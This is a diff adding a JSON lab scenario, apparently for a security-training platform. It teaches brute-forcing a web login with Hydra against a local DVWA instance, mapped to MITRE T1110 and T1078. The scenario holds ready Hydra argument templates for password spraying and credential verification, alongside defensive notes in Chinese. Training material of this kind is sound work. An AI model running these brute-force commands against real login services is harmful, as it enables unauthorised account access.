@@ -1,0 +1,102 @@
+{
+  "id": "brute_force_hydra",
+  "name": "Hydra 弱口令爆破教学",
+  "description": "使用 Hydra 对 HTTP 服务进行弱口令爆破攻击，演示 T1110 Brute Force 技术。包含基础 HTTP 爆破和凭据验证两个步骤。",
+  "category": "credential-access",
+  "difficulty": "intermediate",
+  "estimatedDuration": "5-10 min",
+  "rolesAllowed": [
+    "operator",
+    "admin"
+  ],
+  "mitrePhases": [
+    "Credential Access"
+  ],
+  "mitreTechniques": [
+    "T1110",
+    "T1110.001",
+    "T1110.003",
+    "T1078"
+  ],
+  "targetType": [
+    "web_url",
+    "dvwa",
+    "ssh_host"
+  ],
+  "steps": [
+    {
+      "id": "step1_hydra_http_spray",
+      "name": "HTTP 服务密码喷射攻击",
+      "description": "使用 Hydra 对目标 HTTP 服务进行密码喷射，尝试常见用户名和密码组合",
+      "toolId": "hydra",
+      "payload_id": "auth-brute",
+      "argsTemplate": [
+        "-L",
+        "config/wordlists/common_users.txt",
+        "-P",
+        "config/wordlists/common_passwords.txt",
+        "-I",
+        "-t",
+        "4",
+        "<target>",
+        "http-post-form",
+        "/login.php:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect"
+      ],
+      "expectedOutput": "Hydra 扫描结果，包含尝试的凭据组合",
+      "successCriteria": "工具成功执行并输出扫描结果",
+      "educationalNote": "Hydra 是最常用的弱口令爆破工具之一。T1110 Brute Force 技术通过系统性地尝试大量密码来获取访问权限。防御措施包括：账户锁定策略、MFA、强密码要求。",
+      "ruleIds": [
+        "brute_force_hydra"
+      ],
+      "requires_teacher_review": true
+    },
+    {
+      "id": "step2_hydra_credential_verify",
+      "name": "凭据有效性验证",
+      "description": "使用 Hydra 验证单个凭据，演示 T1078 Valid Accounts 技术",
+      "toolId": "hydra",
+      "payload_id": "auth-brute",
+      "argsTemplate": [
+        "-l",
+        "admin",
+        "-p",
+        "password",
+        "-I",
+        "-t",
+        "2",
+        "<target>",
+        "http-post-form",
+        "/login.php:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect"
+      ],
+      "expectedOutput": "Hydra 验证结果，显示凭据是否有效",
+      "successCriteria": "工具成功执行并输出验证结果",
+      "educationalNote": "一旦获取有效凭据，攻击者可以使用 T1078 Valid Accounts 技术进行横向移动和权限提升。及时发现和响应凭据泄露至关重要。",
+      "ruleIds": [
+        "brute_force_hydra"
+      ],
+      "requires_teacher_review": true
+    }
+  ],
+  "notSuitableFor": [],
+  "baselineGroup": "web-vuln-scan",
+  "expectedOutputPolicy": "expect_output",
+  "emptyOutputExplanation": "hydra 暴力破解，若目标无认证服务则可能无输出",
+  "applicableTargetType": [
+    "web_url",
+    "dvwa",
+    "ssh_host"
+  ],
+  "teachingObjective": "演示 hydra 对 Web 登录表单或 SSH 的暴力破解",
+  "dvwa_profile": {
+    "target_type": "dvwa",
+    "host": "localhost",
+    "port": 8080,
+    "base_url": "http://localhost:8080",
+    "login_url": "http://localhost:8080/login.php",
+    "sqli_url": "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit",
+    "security_level": "low",
+    "requires_cookie": false
+  },
+  "target_class": "dvwa",
+  "disableAutoInsert": true
+}
